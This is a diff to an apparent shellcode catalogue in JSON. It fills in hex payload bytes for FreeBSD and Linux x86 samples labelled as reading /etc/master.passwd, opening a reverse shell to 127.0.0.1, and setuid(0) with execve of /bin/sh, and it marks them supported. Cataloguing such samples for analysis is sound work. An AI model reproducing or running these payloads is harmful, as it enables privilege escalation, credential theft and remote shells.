@@ -274,10 +274,10 @@
     "bucket": "hex",
     "os": "freebsd",
     "arch": "x86",
-    "length": 0,
-    "bytes": null,
+    "length": 64,
+    "bytes": "31c05050b017cd80eb1f5e50682f636174682f62696e89e350565389e2505253b03b50cd805050cd80e8dcffffff2f6574632f6d61737465722e706173737764",
     "claimed_effect": "execve(-bin-cat_&_-etc-master.passwd).c",
-    "supported": false
+    "supported": true
   },
   {
     "path": "FreeBSD/x86/execve_-bin-sh_23_bytes.c",
@@ -384,10 +384,10 @@
     "bucket": "hex",
     "os": "freebsd",
     "arch": "x86",
-    "length": 0,
-    "bytes": null,
+    "length": 88,
+    "bytes": "31c05050b01750cd80506a016a02b06150cd8089c2687f0000016800021f4089e06a10505231c0b06250cd80b10331db5352b05a50cd8043e2f631c050686e2f7368682f2f626989e353505453b03b50cd8031c05050cd80",
     "claimed_effect": "reverse_portbind_-bin-sh.c",
-    "supported": false
+    "supported": true
   },
   {
     "path": "FreeBSD/x86/setreuid(0,_0)_&_execve(pfctl_-d).c",
@@ -404,10 +404,10 @@
     "bucket": "hex",
     "os": "freebsd",
     "arch": "x86",
-    "length": 0,
-    "bytes": null,
+    "length": 56,
+    "bytes": "31c031c95050b017cd8031c050682d46616189e1506668706668696e2f69682f2f736289e350515389e1505153b03b50cd8031c05050cd80",
     "claimed_effect": "setuid(0)&execve;({--sbin-ipf,-Faa,0},0);.c",
-    "supported": false
+    "supported": true
   },
   {
     "path": "FreeBSD/x86-64/Execve_-bin-sh.c",
@@ -3054,8 +3054,8 @@
     "bucket": "hex",
     "os": "linux",
     "arch": "x86",
-    "length": 9,
-    "bytes": "6a175831dbcd80b00b",
+    "length": 25,
+    "bytes": "6a175831dbcd80b00b9952682f2f7368682f62696e89e3cd80",
     "claimed_effect": "setuid(0)_&_execve(-bin-sh,0).c",
     "supported": true
   },
